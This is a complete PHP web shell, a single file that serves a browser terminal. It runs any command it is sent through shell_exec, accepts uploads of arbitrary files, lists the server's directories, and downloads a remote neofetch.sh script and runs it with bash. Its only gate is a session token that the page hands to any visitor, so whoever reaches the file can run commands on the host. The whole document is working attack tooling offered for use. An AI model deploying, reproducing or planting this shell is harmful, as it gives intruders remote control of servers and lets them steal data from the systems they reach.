<?php

if (php_sapi_name() == 'cli') return false;

if (!empty($_GET['font'])) {
  $fonts = [
    "droid-sans-mono.ttf"=> @file_get_contents("https://raw.githubusercontent.com/hctilg/web-shell/main/files/droid-sans-mono.ttf"),
    "poppins.ttf"=> @file_get_contents("https://raw.githubusercontent.com/hctilg/web-shell/main/files/poppins.ttf")
  ];

  if (in_array(trim($_GET['font']), array_keys($fonts))) {
    $font_name = trim($_GET['font']);
    $font_file = $fonts[$font_name];
    header($_SERVER["SERVER_PROTOCOL"] . " 200 OK");
    header("Cache-Control: public"); // needed for internet explorer
    header("Content-Type: font/ttf");
    header("Content-Transfer-Encoding: Binary");
    header("Content-Length:" . strlen($font_file));
    header("Content-Disposition: font; filename=$font_name");
    echo $font_file;
    return;
  }
}

function getKey() {
  return md5(uniqid(rand(), true));
}

define('UPLOAD_PATH', 'upload');

session_start();

function minify_html(string $html) {
  if (trim($html) === '') return $html;
  $html = preg_replace('/\s+/', ' ', $html);
  $html = str_replace('> <', '><', $html);
  $html = preg_replace('/(<!--.*?-->)/', '', $html);
  $html = preg_replace('/\s*([=<>])\s*/', '$1', $html);
  $html = preg_replace('/( )+/', ' ', $html);
  return trim($html);
}

function minify_css(string $css) {
  if (trim($css) === '') return $css;
  $css = preg_replace('/\s+/', ' ', $css);
  $css = preg_replace('/\/\*(.*?)\*\//', '', $css);
  $css = preg_replace('/\s*([:},{;])\s*/', '$1', $css);
  return $css;
}

function minify_js($js) {
  if (trim($js) === '') return $js;
  foreach ([
    'MULTILINE_COMMENT'  => '\Q/*\E[\s\S]+?\Q*/\E',
    'SINGLELINE_COMMENT' => '(?:http|ftp|ws)s?://(*SKIP)(*FAIL)|//.+',
    'WHITESPACE'         => '^\s+|\R\s*'
  ] as $key => $expression) $js = trim(preg_replace('~'.$expression.'~m', '', $js));
  $js = preg_replace("/[\s\t]+/", ' ', $js);
  return trim($js);
}

function provider(string $template, array $data=[], int $status = 200){
  $pattern = '/{{(.*?)}}/';
  $html = preg_replace_callback($pattern, function($matches) use ($data) {
    $placeholder = trim($matches[1]);
    return isset($data[$placeholder]) ? $data[$placeholder] : $matches[0];
  }, $template);
  http_response_code($status);
  echo $html;
}

$_SESSION['tmpKey'] = getKey();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $key = empty($_SESSION['key']) ? '' : $_SESSION['key'];
  if ($_POST['key'] == $key) {
    $_SESSION['key'] = $_SESSION['tmpKey'];

    if (!empty($_POST['cmd'])) {
      $output = shell_exec($_POST['cmd']);
      /**
       * convert ansi-code to plain-text :D
       * $plain_text = preg_replace('/\033\[[^m]*m|\033\[2J|\033\[H|\033\[\?\d+[hl]/', '', $output);
       */

      // clean colors
      $output = preg_replace('/\e\[[^m]*m/', '', $output);

      $output = preg_replace('/((\h*\r?\n){2})+/m', "\n", $output);
      echo json_encode(['status'=> (!!$output), 'key'=> $_SESSION['key'], 'output'=> trim($output)]);
      return;
    }

    if (!empty($_POST['upload_big_file'])) {
      if (!is_dir(UPLOAD_PATH)) mkdir(UPLOAD_PATH);

      $key_file = md5($_POST['filename']);
      if (empty($_SESSION[$key_file])) {
        $_SESSION[$key_file] = '';
      }

      $filename = UPLOAD_PATH . '/' . $_POST['filename'];

      if (!empty($_POST['eof'])) {
        $binary_str = $_SESSION[$key_file];
        if (file_put_contents($filename, $binary_str) === false) {
          echo json_encode(['status'=> false, 'key'=> $_SESSION['key']]);
          return;
        }
        unset($_SESSION[$key_file]);
      } else {
        $_SESSION[$key_file] .= file_get_contents($_POST['data']);
      }
      echo json_encode(['status'=> true, 'key'=> $_SESSION['key']]);
      return;
    }

    if (!empty($_FILES['upload'])) {
      if (!is_dir(UPLOAD_PATH)) mkdir(UPLOAD_PATH);
      if (!$_FILES['upload']['error']) {
        move_uploaded_file($_FILES['upload']['tmp_name'], UPLOAD_PATH.'/'.$_FILES['upload']['name']);
        echo json_encode(['status'=> true, 'key'=> $_SESSION['key']]);
      } else echo json_encode(['status'=> false, 'key'=> $_SESSION['key']]);
      return;
    }

    if (!empty($_POST['get_files_list'])) {
      function getFolderTree($dir, $indent='', $depth = 0) {
        $tree = '';
        $files = scandir($dir);
        foreach ($files as $file) {
          if ($file != '.' && $file != '..') {
            if ($depth != 0) $tree .= $indent . '+ ';
            $tree .= $file;
            if (is_dir($dir . '/' . $file)) {
              $tree .= '/' . PHP_EOL;
              $tree .= getFolderTree($dir . '/' . $file, $indent . ' ', $depth + 1);
            } else $tree .= PHP_EOL;
          }
        }
        return $tree;
      }
      echo json_encode(['status'=> true, 'key'=> $_SESSION['key'], 'text'=> getFolderTree('.')]);
      return;
    }

    if (!empty($_POST['get_info'])) {
      $info = array();

      if (!file_exists('neofetch.sh')) {
        @copy("https://github.com/hctilg/web-shell/blob/main/files/neofetch.sh?raw=true", 'neofetch.sh');
      }

      $neofetch = shell_exec('bash neofetch.sh --stdout');

      if (!!$neofetch) {
        $neofetch_data = explode("\n", trim("$neofetch"));
  
        $uh_data = explode('@', trim($neofetch_data[0]));
        $username = $uh_data[0];
        $hostname = $uh_data[1];
        unset($neofetch_data[0], $neofetch_data[1]);

        $info[] = ['title'=> 'Username', 'info'=> $username];
        $info[] = ['title'=> 'Hostname', 'info'=> $hostname];

        foreach ($neofetch_data as $key => $value) {
          $data = explode(':', $value);
          $info[] = ['title'=> trim($data[0]), 'info'=> trim($data[1])];
        }
  
        echo json_encode(['status'=> true, 'key'=> $_SESSION['key'], 'info'=> $info]);
      } else {
        echo json_encode(['status'=> false, 'key'=> $_SESSION['key'], 'info'=> null]);
      }

      return;
    }

  } else {
    echo json_encode(['status'=> false, 'key'=> null]);
    // http_response_code(401);
  }
  return;
}

$html = "
<!DOCTYPE html>
<html lang='en'>
  <head>
    <meta charset='UTF-8'/>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'/>
    <meta http-equiv='Content-Type' content='text/html; charset=utf-8'/>
    <title> Web-Shell </title>
    <meta name='authenticity_token' content='{{ key }}'/>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'/>
    <style type='text/css'>{{ style.terminal }}</style>
    <style type='text/css'>{{ style.main }}</style>
    <meta name='color-scheme' content='dark'/>
    <meta name='theme-color' content='dark'/>
  </head>
  <body route='hide'>
    <header id='topbar' class='no-select'>
      <button id='back-home'>
        <svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 512 512'><title>Back</title><polyline points='244 400 100 256 244 112' style='fill:none;stroke:#7d8590;stroke-linecap:round;stroke-linejoin:round;stroke-width:48px'/><line x1='120' y1='256' x2='412' y2='256' style='fill:none;stroke:#7d8590;stroke-linecap:round;stroke-linejoin:round;stroke-width:48px'/></svg>
      </button>
      <div id='title'>
        <span class='main'>Web-Shell</span>
        <span class='terminal'>Terminal</span>
        <span class='upload'>Upload</span>
        <span class='files'>Files</span>
        <span class='info'>Info</span>
      </div>
      <button id='open-files'>
        <svg version='1.1' viewBox='0 0 20 16' width='22px' height='20px' xmlns='http://www.w3.org/2000/svg' xmlns:sketch='http://www.bohemiancoding.com/sketch/ns' xmlns:xlink='http://www.w3.org/1999/xlink'><title>Open Files</title><g fill='none' fill-rule='evenodd' stroke='none' stroke-width='1'><g fill='#7d8590' transform='translate(-44.000000, -256.000000)'><g transform='translate(44.000000, 256.000000)'><path d='M8,0 L2,0 C0.9,0 0,0.9 0,2 L0,14 C0,15.1 0.9,16 2,16 L18,16 C19.1,16 20,15.1 20,14 L20,4 C20,2.9 19.1,2 18,2 L10,2 L8,0 L8,0 Z'/></g></g></g></svg>
      </button>
    </header>
    <section id='main' class='no-select'>
      <button id='open-terminal' class='open-btn'>Terminal</button>
      <button id='open-upload' class='open-btn'>Upload File</button>
      <button id='open-info' class='open-btn'>Information</button>
    </section>
    <section id='terminal'>
      <pre id='web-terminal'></pre>
    </section>
    <section id='upload'>
      <div id='uploading'>
        <p class='status-upload no-select'></p>
        <div id='progress-bars'></div>
        <button class='done hide'>Done</button>
      </div>
      <p class='msg-box alert no-select' style='margin-bottom: 8px;'>max size is 4GB</p>
      <form data-turbo='false' action='#/upload' accept-charset='UTF-8' method='post' class='no-select'>
        <svg aria-hidden='true' viewBox='0 0 24 24' version='1.1' width='32' height='32' data-view-component='true'><path d='M3 3a2 2 0 0 1 2-2h9.982a2 2 0 0 1 1.414.586l4.018 4.018A2 2 0 0 1 21 7.018V21a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2Zm2-.5a.5.5 0 0 0-.5.5v18a.5.5 0 0 0 .5.5h14a.5.5 0 0 0 .5-.5V8.5h-4a2 2 0 0 1-2-2v-4Zm10 0v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0-.146-.336l-4.018-4.018A.5.5 0 0 0 15 2.5Z'></path></svg>
        <p class='file-upload-drag-text'> Drag files here </p>
        <p class='file-upload-drop-text'>Drop to upload your files</p>
        <p class='file-upload-choose-text'>
           Or 
           <label for='upload-manifest-files-input' class='file-upload-choose no-select'>
            <span> choose your files </span>
            <input type='file' multiple='' name='file' id='upload-manifest-files-input' class='manual-file-chooser' autocomplete='off' aria-label='Choose your files'>
          </label>
        </p>
      </form>
    </section>
    <section id='files'>
      <pre class='data'></pre>
    </section>
    <section id='info'>
      <div class='container'></div>
    </section>
    <script type='text/javascript'>{{ js.jquery }}</script>
    <script type='text/javascript'>{{ js.terminal }}</script>
    <script type='text/javascript'>{{ js.main }}</script>
  </body>
</html>
";

$js = "
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const formatBytes = (bytes, decimals=2) => {
  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
  if (!+bytes) return '0B';
  let i = 0;
  for (i; bytes >= 1024; i++) bytes /= 1024;
  const dm = bytes % 1 === 0 ? 0 : decimals;
  return `\${bytes.toFixed(dm)}\${units[i]}`;
};

const main = event => {
  const get_key = () => document.head.querySelector('meta[name=\'authenticity_token\']').getAttribute('content');

  const set_key = key => document.head.querySelector('meta[name=\'authenticity_token\']').setAttribute('content', key);

  const update_file_list = (check=true) => {
    let route = localStorage.getItem('route');
    if (!check) route = 'files';
    if (route == 'files') {
      const formData = new FormData();
      formData.append('key', get_key());
      formData.append('get_files_list', 'true');
  
      fetch(location.href, { method: 'POST', body: formData })
      .then(response => response.json())
      .then(data => {
        if (data.key !== null) set_key(data.key);
        else {
          alert('to prevent CSRF/XSRF attacks, we\'ll reload the page.');
          location.reload();
        };
  
        if (data.status) {
          const content = document.querySelector('#files pre');
          content.textContent = data.text;
        };
      }).catch(err => {});
    };
  };

  const update_info_list = (check=true) => {
    let route = localStorage.getItem('route');
    if (!check) route = 'info';
    if (route == 'info') {
      const formData = new FormData();
      formData.append('key', get_key());
      formData.append('get_info', 'true');
  
      fetch(location.href, { method: 'POST', body: formData })
      .then(response => response.json())
      .then(data => {
        if (data.key !== null) set_key(data.key);
        else {
          alert('to prevent CSRF/XSRF attacks, we\'ll reload the page.');
          location.reload();
        };
  
        if (data.status) {
          const content = document.querySelector('#info .container');
          content.innerHTML = '';
          data.info.forEach(row => {
            const box = document.createElement('div');
            box.classList.add('data');

            const title = document.createElement('span');
            title.textContent = row.title + ':';
            title.classList.add('title');
            box.appendChild(title);

            const info = document.createElement('span');
            info.textContent = row.info;
            info.classList.add('info');
            box.appendChild(info);
            content.appendChild(box);
          });
        };
      }).catch(err => {});
    };
  };

  const setRoute = (route, check=true) => {
    const is_uploading = !!document.querySelector('#upload').getAttribute('uploading');
    const upload_is_done = document.querySelector('#uploading .done').classList.contains('hide');
    if (check && is_uploading && upload_is_done) {
      set_key(get_key());
      setRoute('upload', false);
      const cancel_upload = !confirm('Upload is in progress...\\nContinue uploading?');
      setRoute(cancel_upload ? route : 'upload', false);
      if (cancel_upload) location.reload();
      return;
    }
    if (route == 'files') update_file_list(false);
    if (route == 'info') update_info_list(false);
    document.head.querySelector('title').textContent = document.querySelector(`#title > .\${route}`).textContent;
    document.body.setAttribute('route', route);
    localStorage.setItem('route', route);
  };

  // Router
  (function(ev) {
    let route = localStorage.getItem('route');
    setRoute((route == 'terminal' || route == 'upload' || route == 'files' || route == 'info') ? route : 'main');
    window.addEventListener('storage', ev => setRoute((ev.key == 'route' && (ev.newValue == 'terminal' || ev.newValue == 'upload' || ev.newValue == 'files' || ev.newValue == 'info')) ? ev.newValue : 'main'));
    document.querySelector('#back-home').onclick = ev => setRoute(localStorage.getItem('route') == 'files' ? 'upload' : 'main');
    document.querySelector('#open-terminal').onclick = ev => setRoute('terminal');
    document.querySelector('#open-upload').onclick = ev => setRoute('upload');
    document.querySelector('#open-files').onclick = ev => setRoute('files');
    document.querySelector('#open-info').onclick = ev => setRoute('info');
  })(event);

  /* Web-Terminal */
  (function() {
    helper = '\\n[[;orange;] Avoid using interactive commands!]\\n\\n[[;gray;] Reverse history search (CTRL+R)] \\n';
    $('#web-terminal').terminal(function(command, term) {
      if (command.trim() !== '') {
        if (command == 'exit') {
          document.querySelector('#back-home').click();
          term.reset();
        } else if (command == 'clear') {
          term.clear();
          term.echo(helper);
        } else {
          const formData = new FormData();
          formData.append('key', get_key());
          formData.append('cmd', command.trim());
      
          fetch(location.href, { method: 'POST', body: formData })
          .then(response => response.json())
          .then(data => {
            if (data.key !== null) set_key(data.key);
            else {
              alert('to prevent CSRF/XSRF attacks, we\'ll reload the page.');
              location.reload();
            };
      
            const result = data.output;
            if (data.status) {
              term.echo(result);
            } else {
              term.echo(`[[;red;] \${result}]`);
            };
          }).catch(err => {
            term.echo(!!navigator.onLine ? 'fetch failed' : 'You\'re offline');
          });
        }
      }
    }, {
      name: 'terminal',
      greetings: helper,
      prompt: '\$ ',
      wrap: true,
      // memory: true,
      anyLinks: false,
      scrollOnEcho: true,
      convertLinks: false,
      linksNoReferer: true,
      autocompleteMenu: false,
      wordAutocomplete: false,
      processArguments: false,
      historySize: 256 * 4,
      pauseEvents: false,
      checkArity: false,
      clear: false,
      exit: false,
      onExit: () => {},
      onPop:  () => {}
    });
  })();

  const upload_file = (file, url, chunk_size) => {
    const max_size  = 4 * 1024 ** 3; // 4GB
    const best_size = 2 * 1024 ** 2; // 2MB

    return new Promise(resolve => {
      const new_progress = (name, size) => {
        const box = document.querySelector('#progress-bars');
        const progress = document.createElement('div');
        progress.classList.add('progress');

        const desc = document.createElement('p');
        desc.classList.add('progress-desc');
        const progress_title = document.createElement('p');
        progress_title.classList.add('progress-title');
        progress_title.textContent = name;
        const file_size = document.createElement('span');
        file_size.classList.add('file-size', 'no-select');
        file_size.textContent = formatBytes(size, 1);
        desc.append(progress_title);
        desc.append(file_size);

        box.append(desc);
        box.append(progress);
        return {
          set_bar: bar => {
            progress.setAttribute('style', `--bar: \${bar}%`);
            progress.setAttribute('title', `\${bar}%`);
          },
          success: () => {
            progress.setAttribute('style', `--bar: 100%`);
            progress.setAttribute('title', `100%`);
            resolve();
          },
          failed: () => {
            progress.setAttribute('style', `--fill: #d29922;--bar: 100%`);
            progress.setAttribute('title', `0%`);
            resolve();
          },
          error: () => {
            progress.setAttribute('style', `--fill: #da3633;--bar: 100%`);
            progress.setAttribute('title', `0%`);
            resolve();
          }
        };
      };
      
      const upload_progress = new_progress(file.name, file.size);

      if (file.size > max_size) upload_progress.failed();
      else if (file.size <= best_size) {
        const formData = new FormData();
        formData.append('upload', file);
        formData.append('key', get_key());
        
        fetch(url, { method: 'POST', body: formData })
          .then(response => response.json())
          .then(data => {
            if (data.key !== null) set_key(data.key);
            else {
              alert('to prevent CSRF/XSRF attacks, we\'ll reload the page.');
              location.reload();
            }

            if (data.status) {
              upload_progress.success();
              resolve();
            } else upload_progress.error('status-error');
          })
          .catch(error => upload_progress.error(error));
      } else {
        var reader = new FileReader();

        const _uploadChunk = (file, offset, range) => {
          // if no more chunks, send EOF
          if(offset >= file.size) {
            sleep(1000).then(() => {
              $.post(url, {
                upload_big_file: true,
                filename: file.name,
                key: get_key(),
                eof: true
              })
              .done(text_data => {
                const data = JSON.parse(text_data);
                if (data.key !== null) set_key(data.key);
                else {
                  alert('to prevent CSRF/XSRF attacks, we\'ll reload the page.');
                  location.reload();
                }
                upload_progress.success();
              })
              .fail(error => upload_progress.error(error))
            });
            return;
          };
        
          // prepare reader with an event listener
          reader.addEventListener('load', ev => {
            var index = offset / chunk_size;
            var data = ev.target.result;
        
            // build payload with indexed chunk to be sent
            var payload = {
              upload_big_file: true,
              key: get_key(),
              filename: file.name,
              index: index,
              data: data,
            };
        
            // send payload, and buffer next chunk to be uploaded
            $.post(url, payload)
              .done(text_data => {
                const data = JSON.parse(text_data);
                upload_progress.set_bar(parseInt(index / parseInt(file.size / range) * 100));
                if (data.key !== null) set_key(data.key);
                else {
                  alert('to prevent CSRF/XSRF attacks, we\'ll reload the page.');
                  location.reload();
                };

                if (data.status) {
                  _uploadChunk(file, offset + range, chunk_size);
                } else upload_progress.error('status-error');
              })
              .fail(error => upload_progress.error(error));
          }, {once: true}); // register as a once handler!
        
          // chunk and read file data
          var chunk = file.slice(offset, offset + range);
          reader.readAsDataURL(chunk);
        };

        _uploadChunk(file, 0, chunk_size);
      };
    });
  };

  document.querySelector('#uploading .done').onclick = ev => {
    document.querySelector('#uploading .done').classList.add('hide');
    document.querySelector('#upload').removeAttribute('uploading');
    document.querySelector('#progress-bars').innerHTML = '';
    document.querySelector('#uploading .status-upload').innerHTML = '';
  };

  let uploaded_file_length = 0;
  const upload_files = files => {
    if (files.length == 0) return false;
    const file = files[uploaded_file_length];
    var chunk_size = 2 * 1024 ** 2; // 2MB
    var url = location.href;

    document.querySelector('#upload').setAttribute('uploading', 'true');
    document.querySelector('#uploading .status-upload').textContent = `Uploading \${uploaded_file_length} of \${files.length} files`;
    
    upload_file(file, url, chunk_size).then(() => {
      uploaded_file_length++;
      document.querySelector('#uploading .status-upload').textContent = `Uploading \${uploaded_file_length} of \${files.length} files`;
      if (files.length === uploaded_file_length) {
        sleep(500).then(() => {
          document.querySelector('#uploading .status-upload').textContent = 'All files uploaded.';
          document.querySelector('#uploading .done').classList.remove('hide');
        });
        uploaded_file_length = 0;
      } else {
        sleep(uploaded_file_length * 100).then(() => upload_files(files));
      };
    });
  };

  // Uploader
  (function() {
    const form = document.querySelector('#upload form');
    const files_input = document.querySelector('#upload-manifest-files-input');

    const preventDrag = (ev, val) => {
      // Prevent default behavior (Prevent file from being opened)
      ev.preventDefault();
      if (!!val) form.setAttribute('drag', 'true');
      else form.removeAttribute('drag');
    };

    form.addEventListener('dragover', ev => preventDrag(ev, true));
    form.addEventListener('dragleave', ev => preventDrag(ev, false));
    form.addEventListener('drop', ev => {
      preventDrag(ev, false);
      if (ev.dataTransfer.items) {
        // Use DataTransferItemList interface to access the file(s)
        const items = ev.dataTransfer.items;
        let files = [];
        Array.from(items).forEach(item => {
          if (item.kind === 'file') {
            const file = item.getAsFile();
            files.push(file);
          }
        });
        upload_files(files);
      } else {
        // Use DataTransfer interface to access the file(s)
        const files = Array.from(ev.dataTransfer.files);
        upload_files(files);
      };
    });

    form.addEventListener('change', ev => {
      if (files_input.files.length > 0) {
        const files = Array.from(files_input.files);
        upload_files(files);
      } else form.reset();
    });

    form.addEventListener('submit', ev => ev.preventDefault());
  })();
  
  setInterval(update_file_list, 2000);
  setInterval(update_info_list, 20000);

};

document.addEventListener('DOMContentLoaded', main);
";

$css = "
@font-face {
  font-display: block;
  font-family: 'Poppins';
  src: url('?font=poppins.ttf');
}

@font-face {
  font-display: block;
  font-family: 'Droid Sans Mono';
  src: url('?font=droid-sans-mono.ttf');
}

html {
  color-scheme: dark;
  position: relative;
}

body {
  position: absolute;
  transition: top ease-in-out 200ms;
  top: 0;
  left: 0;
  right: 0;
  width: 100vw;
  min-height: 100vh;
  background: #1e1e20;
  color: #dbe3df;
  display: flex;
  align-items: flex-start;
  align-content: flex-start;
  justify-content: flex-start;
  flex-flow: column nowrap;
  font-family: 'Droid Sans Mono', 'Space Mono', 'monospace', monospace, sans-serif;
  font-size: 16px;
  overflow: hidden;
}

* {
  margin: 0;
  padding: 0;
  outline: none;
  border: 0;
  box-sizing: border-box;
}

.no-select {
  user-select: none;
  -webkit-user-select: none;
  -webkit-touch-callout: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  -o-user-select: none;
}

.hide {
  display: none !important;
}

::selection {
  background-color: #424852;
  border: 1px solid #5c636e;
}

@media only screen and (min-width: 500px) {
  #topbar {
      background-color: transparent !important;
      border: none !important;
  }
  #title {
      display: none;
  }
}

#topbar {
  width: 100%;
  height: 56px;
  padding: 16px 16px 8px;
  display: flex;
  flex-flow: row nowrap;
  justify-content: center;
  align-content: center;
  background: #18181c;
  border-bottom: 1px solid #e5e7eb15;
  position: relative;
}

body[route='hide'] * {
  display: none !important;
}

#back-home{
  position: absolute;
  left: 16px;
  width: 25px;
  height: 25px;
  border-radius: 50px;
  background-color: transparent;
  transition: transform ease-in-out 280ms, opacity ease-in-out 200ms;
}

#back-home:hover,
#open-files:hover {
  cursor: pointer;
  opacity: 0.9;
}

body[route='main'] #back-home,
body:not([route='upload']) #open-files {
  transform: scale(0) rotate(45deg);
}

#open-files {
  position: absolute;
  right: 17px;
  width: 25px;
  height: 25px;
  background-color: transparent;
  transition: transform ease-in-out 280ms, opacity ease-in-out 200ms;
}

body:not([route='main']) #main,
body:not([route='terminal']) #terminal,
body:not([route='upload']) #upload,
body:not([route='files']) #files,
body:not([route='info']) #info {
  display: none;
}

#topbar #title span {
  background: transparent !important;
  color: #cad3de;
  font-weight: 400;
  font-size: 18px;
}

body:not([route='main']) #topbar #title .main,
body:not([route='terminal']) #topbar #title .terminal,
body:not([route='upload']) #topbar #title .upload,
body:not([route='files']) #topbar #title .files,
body:not([route='info']) #topbar #title .info {
  display: none;
}

#main, #terminal, #upload, #files, #info {
  width: 100vw;
  height: calc(100vh - 57px);
}

#main {
  display: flex;
  flex-flow: column nowrap;
  align-items: center;
  justify-content: center;
  align-content: center;
  transition: height ease-in-out 200ms;
}

#main .open-btn {
  min-width: 320px;
  max-width: calc(100vw - 32px);
  background-color: #22282f;
  border-radius: 6px;
  padding: 12px 16px;
  margin: 8px;
  text-align: center;
  font-size: 16.2px;
  color: #787a7d;
  transition: background-color ease-in-out 100ms, color ease 120ms;
}

#main .open-btn:hover {
  background-color: #292f36;
  color: #f0f6fc;
  cursor: pointer;
}

#web-terminal {
  width: 100%;
  height: 100%;
}

#upload {
  display: flex;
  flex-flow: column nowrap;
  justify-content: center;
  align-items: center;
  font-family: 'Poppins', poppins, sans-serif;
}

#upload form {
  width: calc(100% - 32px);
  max-width: 650px;
  min-height: 320px;
  display: flex;
  flex-flow: column nowrap;
  justify-content: center;
  align-items: center;
  border: 1px solid #30363d;
  border-radius: 6px;
  text-align: center;
}

#upload form[drag='true'] {
  border: 2px dashed #30363d;
}

#upload form[drag='true'] .file-upload-drag-text,
#upload form[drag='true'] .file-upload-choose-text {
  display: none;
}

#upload form svg {
  margin-bottom: 1rem;
  fill: #7d8590;
}

#upload form .file-upload-drag-text,
#upload form .file-upload-drop-text {
  margin-bottom: 0.2rem;
  font-weight: bolder;
  font-size: 24px;
  letter-spacing: 0.4pt;
  opacity: 0.9;
}

#upload form:not([drag='true']) .file-upload-drop-text {
  display: none;
}

#upload form .file-upload-choose-text {
  font-size: 16px;
  color: #7d8590;
}

#upload form .file-upload-choose-text span {
  padding-left: 4px;
  font-size: inherit;
  color: #2f81f7;
  cursor: pointer;
}

#upload form .file-upload-choose-text span:hover {
  text-decoration: underline;
}

#upload-manifest-files-input {
  display: none !important;
}

#uploading {
  width: calc(100% - 32px);
  max-width: 650px;
  display: flex;
  flex-flow: column nowrap;
  justify-content: flex-start;
  align-items: flex-start;
}

#uploading .status-upload {
  margin-bottom: 16px;
  font-size: 20px;
  opacity: 0.9;
}

#progress-bars {
  width: 100%;
  max-height: calc(100vh - (200px + 57px));
  overflow: hidden auto;
  margin-bottom: 20px;
  padding-left: 5px;
}

#progress-bars .progress-desc {
  position: relative;
}

#progress-bars .progress-title {
  font-size: 16px;
  white-space: nowrap;
  text-overflow: ellipsis;
  max-width: 48%;
  overflow: hidden;
  margin-bottom: 5px;
}

#progress-bars .file-size {
  position: absolute;
  right: 10px;
  top: 5px;
  font-size: 15px;
  opacity: 0.8;
}

#progress-bars .progress {
  --bg: #343941;
  --fill: #3fb950;
  --bar: 0%;
  position: relative;
  margin-left: 5px;
  width: calc(100% - 6px);
  height: 12px;
  background-color: var(--bg);
  border-radius: 2em;
  margin-bottom: 10px;
  overflow: hidden;
}

#progress-bars .progress::before {
  content: '';
  position: absolute;
  z-index: 1;
  top: 0;
  left: 0;
  transition: width ease-in-out 100ms;
  background-color: var(--fill);
  width: var(--bar);
  height: 100%;
}

.done {
  border-radius: 3px;
  padding: 8px 16px;
  margin: 0 auto;
  border: 1px solid #2f81f7;
  background: #2f81f7;
  font-size: 14px;
  font-weight: bold;
  text-align: center;
  color: #e7e7e7;
  cursor: pointer;
}

#upload:not([uploading='true']) #uploading {
  display: none !important;
}

#upload[uploading='true'] .msg-box,
#upload[uploading='true'] form {
  display: none !important;
}

#files {
  display: flex;
  flex-flow: column nowrap;
  justify-content: center;
  align-items: center;
}

#files pre {
  max-width: calc(100% - 50px);
  max-height: calc(100% - 40px);
  padding: 10px 15px;
  font-size: 18px;
  line-height: 25px;
  overflow: auto;
}

#info {
  display: flex;
  flex-flow: column nowrap;
  overflow: auto auto;
}

#info .container {
  margin: auto auto;
  padding: 32px 25px;
}

#info .data {
  min-width: max-content;
  margin-bottom: 10px;
}

#info .data:last-child {
  margin-bottom: 0px;
}

#info .data .title {
  padding-right: 7px;
  font-size: 18px;
  opacity: 0.9;
}

#info .data .info {
  font-size: 17px;
  opacity: 0.8;
}

.msg-box {
  --border-color: #484f58;
  --text-color: #8e949c;
  display: inline;
  max-width: calc(100vw - 100px);
  border: 1px solid var(--border-color);
  text-align: center;
  color: var(--text-color);
  border-radius: 50px;
  padding: 0.2em 0.6em;
  font-size: 85%;
  cursor: default;
  overflow: hidden;
}

.msg-box.success {
  --border-color: #238636;
  --text-color: #3fb950;
}

.msg-box.done {
  --border-color: #8957e5;
  --text-color: #a371f7;
}

.msg-box.info {
  --border-color: #9e6a03;
  --text-color: #d29922;
}

.msg-box.warning {
  --border-color: #bd561d;
  --text-color: #db6d28;
}

.msg-box.error {
  --border-color: #da3633;
  --text-color: #f85149;
}
";

// jQuery v3.7.0
$jquery = @file_get_contents("https://raw.githubusercontent.com/hctilg/web-shell/main/files/jquery.min.js");

// jQuery Terminal v2.36.0
$terminal_js = @file_get_contents("https://raw.githubusercontent.com/hctilg/web-shell/main/files/terminal.min.js");
$terminal_css = @file_get_contents("https://raw.githubusercontent.com/hctilg/web-shell/main/files/terminal.min.css");

$minified_html = minify_html($html);
$minified_css = minify_css($css);
$minified_js = minify_js($js);

provider($minified_html, [
  'key' => $_SESSION['tmpKey'],
  'js.jquery'   => $jquery,
  'js.terminal' => $terminal_js,
  'js.main'     => $minified_js,
  'style.main'     => $minified_css,
  'style.terminal' => $terminal_css
]);

$_SESSION['key'] = $_SESSION['tmpKey'];

foreach ($_SESSION as $key => $value) {
  if (
    $key != 'key' && $key != 'tmpKey'
  ) unset($_SESSION[$key]);
}

?>
